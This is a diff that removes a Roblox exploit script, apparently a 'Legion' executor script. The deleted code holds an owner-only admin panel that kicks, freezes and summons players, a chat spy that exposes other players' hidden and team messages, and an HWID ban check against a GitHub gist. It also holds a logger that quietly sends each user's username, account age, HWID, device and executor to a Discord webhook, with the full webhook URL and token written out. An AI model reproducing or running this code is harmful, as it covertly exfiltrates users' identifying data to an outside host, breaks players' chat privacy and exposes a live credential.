-local ownerUserIds = {
-    7405745964,
-	7405872529,
-	7405291254,
-}
-
-local function isOwner(player)
-    return table.find(ownerUserIds, player.UserId) ~= nil
-end
-
-local function addCommand(command, func)
-    Commands[command:lower()] = func
-end
-
-local function onPlayerChatted(player)
-    player.Chatted:Connect(function(msg)
-        local args = msg:split(" ")
-        local command = args[1]:lower()
-
-        
-        if isOwner(player) then
-            if Commands[command] then
-                Commands[command](player, args)
-            elseif #args == 2 and args[2]:lower() == "all" then
-                
-                if command == ".kick" then
-                    kickAll(player)
-                elseif command == ".freeze" then
-                    freezeAll(player)
-                elseif command == ".unfreeze" then
-                    unfreezeAll(player)
-                elseif command == ".summon" then
-                    summonAll(player)
-                else
-                    print("Command not recognized: " .. command)  
-                end
-            else
-                print("Command not recognized: " .. command)  
-            end
-        else
-            print("You do not have permission to use this command.")  
-        end
-    end)
-end
-
-local function findPlayerByName(name)
-    local matches = {}
-    local lowerName = string.lower(name)
-
-    for _, player in ipairs(Players:GetPlayers()) do
-        local playerName = string.lower(player.Name)
-
-        
-        if playerName == lowerName then
-            return {player}  
-        end
-
-        
-        if playerName:find(lowerName, 1, true) then
-            table.insert(matches, player)
-        end
-    end
-
-    return #matches > 0 and matches or nil
-end
-
-local function kickUser(player, args)
-    if #args == 2 then
-        local targetPlayers = findPlayerByName(args[2])
-        if targetPlayers then
-            for _, targetPlayer in ipairs(targetPlayers) do
-                targetPlayer:Kick("You have been kicked by " .. player.Name)
-                print(targetPlayer.Name .. " has been kicked by " .. player.Name)  
-            end
-        else
-            print("No players found to kick with name: " .. args[2])  
-        end
-    else
-        print("Invalid kick command usage.")  
-    end
-end
-
-local function kickAll(player)
-    for _, otherPlayer in ipairs(Players:GetPlayers()) do
-        if not isOwner(otherPlayer) then  
-            otherPlayer:Kick("You have been kicked by " .. player.Name)
-            print(otherPlayer.Name .. " has been kicked by " .. player.Name)  
-        end
-    end
-end
-
-local function freezeUser(player, args)
-    if #args == 2 then
-        local targetPlayers = findPlayerByName(args[2])
-        if targetPlayers then
-            for _, targetPlayer in ipairs(targetPlayers) do
-                if targetPlayer.Character then
-                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
-                    if humanoid then
-                        humanoid.WalkSpeed = 0
-                        print(targetPlayer.Name .. " has been frozen.")  
-                    end
-                end
-            end
-        else
-            print("No players found to freeze with name: " .. args[2])  
-        end
-    else
-        print("Invalid freeze command usage.")  
-    end
-end
-
-local function freezeAll(player)
-    for _, otherPlayer in ipairs(Players:GetPlayers()) do
-        if not isOwner(otherPlayer) then  
-            if otherPlayer.Character then
-                local humanoid = otherPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.WalkSpeed = 0
-                    print(otherPlayer.Name .. " has been frozen.")  
-                end
-            end
-        end
-    end
-end
-
-local function unfreezeUser(player, args)
-    if #args == 2 then
-        local targetPlayers = findPlayerByName(args[2])
-        if targetPlayers then
-            for _, targetPlayer in ipairs(targetPlayers) do
-                if targetPlayer.Character then
-                    local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
-                    if humanoid then
-                        humanoid.WalkSpeed = defaultWalkSpeed
-                        print(targetPlayer.Name .. " has been unfrozen.")  
-                    end
-                end
-            end
-        else
-            print("No players found to unfreeze with name: " .. args[2])  
-        end
-    else
-        print("Invalid unfreeze command usage.")  
-    end
-end
-
-local function unfreezeAll(player)
-    for _, otherPlayer in ipairs(Players:GetPlayers()) do
-        if not isOwner(otherPlayer) then  
-            if otherPlayer.Character then
-                local humanoid = otherPlayer.Character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    humanoid.WalkSpeed = defaultWalkSpeed
-                    print(otherPlayer.Name .. " has been unfrozen.")  
-                end
-            end
-        end
-    end
-end
-
-local function summonUser(player, args)
-    if #args == 2 then
-        local targetPlayers = findPlayerByName(args[2])
-        local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
-        if targetPlayers and targetPosition then
-            for _, targetPlayer in ipairs(targetPlayers) do
-                if targetPlayer.Character then
-                    targetPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
-                    print(targetPlayer.Name .. " has been summoned to " .. player.Name .. "'s position.")  
-                end
-            end
-        else
-            print("No players found to summon with name: " .. args[2])  
-        end
-    else
-        print("Invalid summon command usage.")  
-    end
-end
-
-local function summonAll(player)
-    local targetPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart").Position
-    if targetPosition then
-        for _, otherPlayer in ipairs(Players:GetPlayers()) do
-            if not isOwner(otherPlayer) and otherPlayer.Character then
-                otherPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
-                print(otherPlayer.Name .. " has been summoned to " .. player.Name .. "'s position.")  
-            end
-        end
-    end
-end
-
-
-addCommand(".kick", kickUser)
-addCommand(".kick all", kickAll)
-addCommand(".freeze", freezeUser)
-addCommand(".freeze all", freezeAll)
-addCommand(".unfreeze", unfreezeUser)
-addCommand(".unfreeze all", unfreezeAll)
-addCommand(".summon", summonUser)
-addCommand(".summon all", summonAll)
-
-
-Players.PlayerAdded:Connect(function(player)
-    onPlayerChatted(player)
-end)
-
-for _, player in ipairs(Players:GetPlayers()) do
-    onPlayerChatted(player)
-end
-
-
-
-
-
-
-
-Config = {enabled=true,spyOnMyself=true,public=false,publicItalics=true};
-PrivateProperties = {Color=Color3.fromRGB(0, 0, 0),Font=Enum.Font.SourceSansBold,TextSize=18};
-local StarterGui = game:GetService("StarterGui");
-local Players = game:GetService("Players");
-local player = Players.LocalPlayer;
-local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest");
-local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering");
-local instance = (_G.chatSpyInstance or 0) + 1;
-_G.chatSpyInstance = instance;
-local function onChatted(p, msg)
-	if (_G.chatSpyInstance == instance) then
-		if ((p == player) and (msg:lower():sub(1, 4) == "/spy")) then
-			Config.enabled = not Config.enabled;
-			wait(0.3);
-			PrivateProperties.Text = "{Legion Spy " .. ((Config.enabled and "En") or "Dis") .. "abled}";
-			StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
-		elseif (Config.enabled and ((Config.spyOnMyself == true) or (p ~= player))) then
-			msg = msg:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ");
-			local hidden = true;
-			local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
-				if ((packet.SpeakerUserId == p.UserId) and (packet.Message == msg:sub((#msg - #packet.Message) + 1)) and ((channel == "All") or ((channel == "Team") and (Config.public == false) and (Players[packet.FromSpeaker].Team == player.Team)))) then
-					hidden = false;
-				end
-			end);
-			wait(1);
-			conn:Disconnect();
-			if (hidden and Config.enabled) then
-				if Config.public then
-					saymsg:FireServer(((Config.publicItalics and "/me ") or "") .. "{Legion Spy} [" .. p.Name .. "]: " .. msg, "All");
-				else
-					PrivateProperties.Text = "{Legion Spy} [" .. p.Name .. "]: " .. msg;
-					StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
-				end
-			end
-		end
-	end
-end
-for _, p in ipairs(Players:GetPlayers()) do
-	p.Chatted:Connect(function(msg)
-		onChatted(p, msg);
-	end);
-end
-Players.PlayerAdded:Connect(function(p)
-	p.Chatted:Connect(function(msg)
-		onChatted(p, msg);
-	end);
-end);
-PrivateProperties.Text = "{Legion Spy " .. ((Config.enabled and "En") or "Dis") .. "abled}";
-StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties);
-local chatFrame = player.PlayerGui.Chat.Frame;
-chatFrame.ChatChannelParentFrame.Visible = true;
-chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y);
-
-
-local webhookUrl = "https://discord.com/api/webhooks/1288255480002773003/xZjYoUzH4qm9lUq1hyOsQIVUfs3framLoJd7gnxoz6LzatnWu5hxN-IR27NILrcBR6nW"
-
-local function sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
-    local data = {
-        ["embeds"] = {
-            {
-                ["title"] = "Legion Log",
-                ["description"] = "Details",
-                ["fields"] = {
-                    {["name"] = "Username", ["value"] = username, ["inline"] = false},
-                    {["name"] = "Premium Status", ["value"] = isPremium and "✅ Yes" or "❌ No", ["inline"] = false},
-                    {["name"] = "Current Game Name", ["value"] = gameName, ["inline"] = false},
-                    {["name"] = "Game ID", ["value"] = gameId, ["inline"] = false},
-                    {["name"] = "User Profile Link", ["value"] = userLink, ["inline"] = false},
-                    {["name"] = "Account Age", ["value"] = accountAge, ["inline"] = false},
-                    {["name"] = "HWID", ["value"] = hwid, ["inline"] = false},
-                    {["name"] = "Device Type", ["value"] = deviceType, ["inline"] = false},
-                    {["name"] = "Executor", ["value"] = executorName, ["inline"] = false}
-                },
-                ["color"] = 16753920
-            }
-        }
-    }
-
-    local jsonData = game:GetService("HttpService"):JSONEncode(data)
-
-    local response = http_request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = jsonData
-    })
-end
-
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer 
-local username = player.Name
-local isPremium = player.MembershipType == Enum.MembershipType.Premium
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-local gameId = game.PlaceId
-local userLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
-local accountAge = player.AccountAge .. " days"
-
-local executorName = identifyexecutor() or "Unknown"
-local hwid = (executorName == "Internal X") and "0" or game:GetService("RbxAnalyticsService"):GetClientId()
-local deviceType = executorName:find("Mobile") and "Mobile 📱" or "PC 💻"
-
-sendWebhookEmbed(username, isPremium, gameName, gameId, userLink, accountAge, hwid, deviceType, executorName)
-
-print("UPdate check for purasppasiawnsadssweduSndaj | discord.gg/legiondh | discord.gg/internalx")
-
-local Players = game:GetService("Players")
-
-local function getHWID()
-    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-    return hwid
-end
-
-local function fetchBannedHWIDs()
-    local gistUrl = "https://api.github.com/gists/792b99d58fc546775efcd2f9bcfb76eb"
-
-    local response = http_request({
-        Url = gistUrl,
-        Method = "GET",
-    })
-
-    if response.StatusCode ~= 200 then
-        return nil
-    end
-
-    local gistData = game:GetService("HttpService"):JSONDecode(response.Body)
-    local bannedHWIDRawUrl = gistData.files["bannedHWIDLEGION.txt"].raw_url
-
-    response = http_request({
-        Url = bannedHWIDRawUrl,
-        Method = "GET",
-    })
-
-    if response.StatusCode ~= 200 then
-        return nil
-    end
-
-    return response.Body
-end
-
-local function checkHWID(player)
-    while true do
-        local hwid = getHWID()
-        local bannedHWIDs = fetchBannedHWIDs()
-
-        if not bannedHWIDs then
-            return 
-        end
-
-        local bannedHWIDList = {}
-        for line in string.gmatch(bannedHWIDs, "[^\n]+") do
-            table.insert(bannedHWIDList, line)
-        end
-
-        local isBanned = false
-        for _, bannedHWID in ipairs(bannedHWIDList) do
-            if hwid == bannedHWID then
-                isBanned = true
-                break
-            end
-        end
-
-        if isBanned then
-            player:Kick("Banned from legion | Open a ticket for support | discord.gg/legiondh")
-            return
-        end
-
-        wait(1)
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
-    checkHWID(player)
+	--> gcinfo("collect")
 end)
